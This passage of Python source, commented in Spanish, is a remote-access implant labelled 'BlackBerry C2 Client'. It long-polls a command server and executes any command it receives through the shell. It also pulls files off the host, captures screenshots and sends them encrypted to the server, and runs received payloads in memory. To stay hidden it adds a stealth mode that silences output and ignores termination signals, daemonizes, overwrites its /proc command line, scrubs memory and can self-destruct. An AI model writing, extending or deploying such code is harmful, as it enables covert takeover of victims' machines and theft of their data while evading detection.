    """Crea un archivo BMP desde datos RGB raw"""
    try:
        row_size = ((width * 3 + 3) // 4) * 4
        pixel_data_size = row_size * height
        file_size = 54 + pixel_data_size
        
        bmp_header = bytearray([
            0x42, 0x4D,  # BM
            *file_size.to_bytes(4, 'little'),
            0, 0, 0, 0,
            54, 0, 0, 0
        ])
        
        info_header = bytearray([
            40, 0, 0, 0,
            *width.to_bytes(4, 'little'),
            *height.to_bytes(4, 'little'),
            1, 0, 24, 0, 0, 0, 0, 0,
            *pixel_data_size.to_bytes(4, 'little'),
            0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
        ])
        
        pixel_data = bytearray()
        row_padding = row_size - (width * 3)
        
        for y in range(height - 1, -1, -1):
            row_start = y * width * 3
            for x in range(width):
                pixel_start = row_start + (x * 3)
                r = rgb_data[pixel_start]
                g = rgb_data[pixel_start + 1]
                b = rgb_data[pixel_start + 2]
                pixel_data.extend([b, g, r])
            pixel_data.extend([0] * row_padding)
        
        return bytes(bmp_header + info_header + pixel_data)
    except Exception:
        return None

# ==================== PROCESAMIENTO DE COMANDOS ====================

def process_command(cmd, client):
    if not cmd:
        return
    
    output = ""
    
    try:
        if cmd == "GET_HOSTNAME":
            output = socket.gethostname()
        
        elif cmd == "GET_CAPABILITIES":
            caps = ["zlib", "http", "long-polling", "uuid-session"]
            if ZSTD_AVAILABLE:
                caps.append("zstd")
            caps.append("py,sh,pl,rb,php,js,lua,ps1,go,java")
            output = "CAPS:" + ",".join(caps)
        
        elif cmd == "auto-destroy":
            try:
                client.send_message("[!] Iniciando autodestrucción profunda...")
                time.sleep(0.5)
                self_destruct()
            except:
                self_destruct()
            return
        
        elif cmd == "GET_CWD":
            output = os.getcwd()
        
        elif cmd == "whoami":
            output = getpass.getuser()
        
        elif cmd.startswith("cd "):
            try:
                target_dir = cmd.split(maxsplit=1)[1]
                os.chdir(target_dir)
                output = f"Directorio cambiado a: {os.getcwd()}"
            except Exception as e:
                output = f"[ERROR] cd: {e}"
        
        elif cmd.startswith("FILE_EXISTS "):
            try:
                file_path = cmd.split(maxsplit=1)[1]
                if os.path.isfile(file_path):
                    output = f"FILE_EXISTS:YES:{os.path.getsize(file_path)}"
                else:
                    output = "FILE_NOT_FOUND"
            except:
                output = "FILE_NOT_FOUND"
        
        elif cmd.startswith("FILE_SIZE "):
            try:
                file_path = cmd.split(maxsplit=1)[1]
                if os.path.isfile(file_path):
                    file_size = os.path.getsize(file_path)
                    output = f"FILE_SIZE:{file_size}"
                else:
                    output = "FILE_SIZE:0"
            except:
                output = "FILE_SIZE:0"
        
        elif cmd.startswith("GET_FILE "):
            file_path = cmd.split(maxsplit=1)[1]
            client.send_file_to_server(file_path)
            return
        
        elif cmd == "SCREENSHOT" or cmd.startswith("SCREENSHOT"):
            try:
                screenshot_data = capture_screenshot()
                if screenshot_data:
                    # Enviar el tamaño primero
                    size = len(screenshot_data)
                    sha = hashlib.sha256(screenshot_data).hexdigest()
                    header = f"SCREENSHOT_SIZE {size} {sha}"
                    client.send_message(header)
                    
                    # Enviar la imagen en chunks
                    timeout_val = calculate_file_timeout(size)
                    offset = 0
                    
                    while offset < size:
                        chunk = screenshot_data[offset:offset + CHUNK_SIZE]
                        offset += CHUNK_SIZE
                        
                        flag = 0
                        payload_chunk = chunk
                        
                        if ENABLE_COMPRESSION:
                            try:
                                comp = zlib.compress(chunk, level=COMPRESSION_LEVEL)
                                if len(comp) < len(chunk):
                                    payload_chunk = comp
                                    flag = 1
                            except:
                                pass
                        
                        aesgcm = AESGCM(client.aes_key)
                        nonce = os.urandom(12)
                        ct = aesgcm.encrypt(nonce, payload_chunk, None)
                        packet = bytes([flag]) + nonce + ct
                        
                        # Enviar directamente con HTTP POST
                        full_packet = struct.pack('!I', len(packet)) + packet
                        client.send_raw_encrypted_data(full_packet)
                    
                    # Confirmar envío exitoso
                    client.send_message("[SUCCESS] Screenshot capturada y enviada")
                    return
                else:
                    output = "[ERROR] No se pudo capturar la pantalla"
            except Exception as e:
                output = f"[ERROR] Screenshot: {str(e)}"
        
        elif cmd.startswith("SIZE "):
            result = client.receive_file(cmd)
            if result:
                file_data, put_cmd = result
                handle_received_file(file_data, put_cmd, client)
            return
        
        else:
            try:
                result = subprocess.run(
                    cmd, 
                    shell=True, 
                    capture_output=True, 
                    text=True, 
                    timeout=60,
                    errors='replace'
                )
                output = (result.stdout + result.stderr).strip()
                if not output:
                    output = f"[Comando ejecutado. Código: {result.returncode}]"
            except subprocess.TimeoutExpired:
                output = "[ERROR] Timeout ejecutando comando (60s)"
            except Exception as e:
                output = f"[ERROR] Ejecutando comando: {str(e)}"
        
        log(f"← '{cmd[:40]}...' → {len(output)} bytes")
        client.send_message(output)
        
    except Exception as e:
        log(f"Error procesando comando '{cmd}': {e}")
        try:
            client.send_message(f"[ERROR] {e}")
        except:
            pass

def handle_received_file(file_data, put_cmd, client):
    try:
        parts = put_cmd.split()
        file_name = parts[1] if len(parts) > 1 else "received_file"
        execute = "-exc" in parts
        
        if execute:
            log(f"Ejecutando en memoria: {file_name}")
            success, out = execute_in_memory_robust(file_data, file_name)
            
            if len(out) > MAX_OUTPUT_SIZE:
                out = out[:MAX_OUTPUT_SIZE] + f"\n[... truncado, {len(out)} bytes totales]"
            
            if success:
                response = f"[SUCCESS] '{file_name}' ejecutado:\n{out}"
            else:
                response = f"[ERROR] Fallo: {out}"
        else:
            try:
                save_path = os.path.basename(file_name)
                with open(save_path, "wb") as f:
                    f.write(file_data)
                response = f"[SUCCESS] Archivo '{save_path}' guardado ({format_bytes(len(file_data))})"
            except Exception as e:
                response = f"[ERROR] No se pudo guardar: {e}"
        
        client.send_message(response)
        
    except Exception as e:
        log(f"Error manejando archivo recibido: {e}")
        client.send_message(f"[ERROR] {e}")

# ==================== WORKERS ====================

def heartbeat_worker(client, stop_event):
    log("Iniciando heartbeat worker...")
    
    while not stop_event.is_set():
        try:
            if client.is_connected():
                if client.send_message("HEARTBEAT"):
                    log("→ Heartbeat enviado")
                else:
                    log("⚠ Error enviando heartbeat")
                    with client.lock:
                        client.connected = False
                    break
            
            stop_event.wait(HEARTBEAT_INTERVAL)
            
        except Exception as e:
            log(f"Error en heartbeat worker: {e}")
            time.sleep(5)

def polling_worker(client, stop_event):
    """Worker de LONG-POLLING (una petición cada 30s max)."""
    log("Iniciando long-polling worker...")
    poll_count = 0
    
    while not stop_event.is_set():
        try:
            if not client.is_connected():
                time.sleep(2)
                continue
            
            # Long-polling: el servidor mantiene la conexión hasta 30s
            log("→ Long-polling...")
            message = client.receive_message()
            
            if message:
                poll_count = 0
                
                if message == "HEARTBEAT_ACK":
                    log("[+] Heartbeat ACK recibido")
                elif message == "POLL_ACK":
                    pass
                elif message.startswith("SIZE "):
                    log(f"→ Archivo entrante: {message}")
                    threading.Thread(
                        target=process_command,
                        args=(message, client),
                        daemon=True
                    ).start()
                else:
                    log(f"→ Comando: {message[:50]}...")
                    threading.Thread(
                        target=process_command,
                        args=(message, client),
                        daemon=True
                    ).start()
            else:
                poll_count += 1
                if poll_count % 10 == 0:
                    log(f"Long-polling... ({poll_count} ciclos)")
            
            # Pequeña pausa antes del siguiente long-poll
            time.sleep(0.1)
            
        except Exception as e:
            log(f"Error en long-polling: {e}")
            time.sleep(2)

# ==================== MAIN ====================

def run_client():
    log("╔" + "═" * 50 + "╗")
    log("║" + " " * 5 + "BlackBerry HTTP Client v6.2" + " " * 16 + "║")
    log("║" + " " * 3 + "UUID SESSION + LONG-POLLING + AUTO HTTPS" + " " * 6 + "║")
    log("╚" + "═" * 50 + "╝")
    log(f"Servidor: {SERVER_HOST}:{SERVER_PORT}")
    log(f"Long-polling: {LONG_POLL_TIMEOUT}s timeout")
    log(f"Debug: {'ACTIVADO' if DEBUG else 'DESACTIVADO'}")
    log(f"Compresión: zlib{' + zstd' if ZSTD_AVAILABLE else ''}")
    log(f"Lenguajes: Python, Bash, Perl, Ruby, PHP, Node.js, PowerShell, Lua, Go, Java")
    log("")
    
    while True:
        client = None
        stop_event = threading.Event()
        heartbeat_thread = None
        polling_thread = None
        
        try:
            log(f"Conectando a {SERVER_HOST}:{SERVER_PORT}...")
            client = BlackBerryHTTPClient(SERVER_HOST, SERVER_PORT, USE_HTTPS)
            
            if not client.connect():
                log("✗ Handshake falló. Reintentando...")
                time.sleep(RECONNECT_DELAY)
                continue
            
            log("")
            log("[+] Cliente activo con long-polling")
            log("[+] Esperando comandos del servidor...")
            log("")
            
            heartbeat_thread = threading.Thread(
                target=heartbeat_worker,
                args=(client, stop_event),
                daemon=True
            )
            heartbeat_thread.start()
            
            polling_thread = threading.Thread(
                target=polling_worker,
                args=(client, stop_event),
                daemon=True
            )
            polling_thread.start()
            
            while client.is_connected() and not stop_event.is_set():
                time.sleep(1)
            
            log("⚠ Conexión perdida")
            
        except KeyboardInterrupt:
            log("")
            log("[+] Deteniendo cliente...")
            break
            
        except Exception as e:
            log(f"✗ Error: {e}")
            import traceback
            traceback.print_exc()
            
        finally:
            stop_event.set()
            
            if client:
                client.disconnect()
            
            if heartbeat_thread and heartbeat_thread.is_alive():
                heartbeat_thread.join(timeout=2)
            
            if polling_thread and polling_thread.is_alive():
                polling_thread.join(timeout=2)
            
            log(f"Reconectando en {RECONNECT_DELAY}s...")
            time.sleep(RECONNECT_DELAY)

def deep_memory_cleanup():
    """Limpieza PROFUNDA de memoria sin dejar rastros."""
    import gc
    import sys
    
    try:
        # Limpiar frames activos
        frame = sys._getframe()
        while frame:
            try:
                if hasattr(frame, 'f_locals'):
                    for var_name in list(frame.f_locals.keys()):
                        try:
                            frame.f_locals[var_name] = None
                        except:
                            pass
                frame = frame.f_back
            except:
                break
        
        # Limpiar variables globales sensibles
        globals_to_clean = ['SERVER_URL', 'HEARTBEAT_INTERVAL', 'AES_KEY_BYTES']
        for var in globals_to_clean:
            try:
                if var in globals():
                    globals()[var] = None
            except:
                pass
        
        # Limpiar cache de módulos
        try:
            for module_name in list(sys.modules.keys()):
                if 'BlackBerry' in module_name or 'crypto' in module_name:
                    try:
                        sys.modules[module_name] = None
                    except:
                        pass
        except:
            pass
        
        # Múltiples recolecciones de basura
        for _ in range(5):
            gc.collect(2)
        
        # Limpiar traceback
        sys.exc_clear() if hasattr(sys, 'exc_clear') else None
        
        return True
    except Exception:
        return False

def zombie_process_cleanup():
    """Limpia procesos zombie y entradas en /proc."""
    try:
        import os
        import signal
        
        try:
            os.waitpid(-1, os.WNOHANG)
        except:
            pass
        
        if sys.platform.startswith('linux'):
            try:
                pid = os.getpid()
                cmdline_path = f'/proc/{pid}/cmdline'
                if os.access(cmdline_path, os.W_OK):
                    try:
                        with open(cmdline_path, 'w') as f:
                            f.write('\x00' * 16)
                    except:
                        pass
            except:
                pass
        
        return True
    except:
        return False

# ==================== MODO SIGILOSO ====================
class SilentMode:
    def write(self, x): pass
    def flush(self): pass

def enable_stealth():
    global DEBUG
    DEBUG = False
    sys.stdout = SilentMode()
    sys.stderr = SilentMode()
    signal.signal(signal.SIGINT, signal.SIG_IGN)
    signal.signal(signal.SIGTERM, signal.SIG_IGN)
    try:
        os.chdir("/tmp")
    except:
        pass

def daemonize():
    if os.name != 'posix':
        return
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError:
        pass
    os.setsid()
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError:
        pass
    sys.stdout.flush()
    sys.stderr.flush()
    with open(os.devnull, 'r') as dev_null:
        os.dup2(dev_null.fileno(), sys.stdin.fileno())
    with open(os.devnull, 'a+') as dev_null:
        os.dup2(dev_null.fileno(), sys.stdout.fileno())
    with open(os.devnull, 'a+') as dev_null:
        os.dup2(dev_null.fileno(), sys.stderr.fileno())

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description='BlackBerry Client HTTP/s')
    parser.add_argument('-H', '--host', type=str, default=SERVER_HOST, 
                        help='Host del servidor', dest='host')
    parser.add_argument('-p', '--port', type=int, default=SERVER_PORT, 
                        help='Puerto del servidor')
    parser.add_argument('--hmac', type=str, default='false', 
                        help='Secreto HMAC (false o clave secreta)')
    parser.add_argument('--fingerprint', type=str, default='false', 
                        help='Fingerprint ECDHE esperado (false o fingerprint)')
    parser.add_argument('--https', action='store_true', help='Forzar HTTPS')
    parser.add_argument('--http', action='store_true', help='Forzar HTTP')
    parser.add_argument('--daemon', action='store_true', 
                        help='Ejecutar como daemon en segundo plano')
    
    args = parser.parse_args()
    
    SERVER_HOST = args.host
    SERVER_PORT = args.port
    
    # Configurar HMAC secret (servidor genera token hex)
    if args.hmac != 'false':
        s = args.hmac.strip()
        try:
            HMAC_PRE_SHARED_SECRET = bytes.fromhex(s)
        except ValueError:
            HMAC_PRE_SHARED_SECRET = s.encode('utf-8')
    
    # Configurar fingerprint
    if args.fingerprint != 'false':
        VERIFY_FINGERPRINT = True
        EXPECTED_FINGERPRINT = args.fingerprint
    
    if args.https:
        USE_HTTPS = True
    elif args.http:
        USE_HTTPS = False
    
    # Configurar modo daemon
    DAEMON_MODE = args.daemon
    
    if DAEMON_MODE:
        if os.name == 'posix':
            daemonize()
        enable_stealth()
    else:
        DEBUG = True
        print("=" * 60)
        print("BlackBerry C2 Client - HTTP/HTTPS")
        print("=" * 60)
        print(f"Host: {SERVER_HOST}")
        print(f"Port: {SERVER_PORT}")
        print(f"Protocolo: {'HTTPS (forzado)' if args.https else 'HTTP (forzado)' if args.http else 'Auto-detectar'}")
        print(f"HMAC: {'Configurado' if args.hmac != 'false' else 'Default'}")
        print(f"Fingerprint ECDHE: {'Verificación habilitada' if VERIFY_FINGERPRINT else 'No verificar'}")
        print(f"Modo: Interactivo (--daemon para segundo plano)")
        print("=" * 60)
        print()
    
    try:
        run_client()
    except KeyboardInterrupt:
        log("")
        log("[+] Cliente detenido por el usuario")
        sys.exit(0)
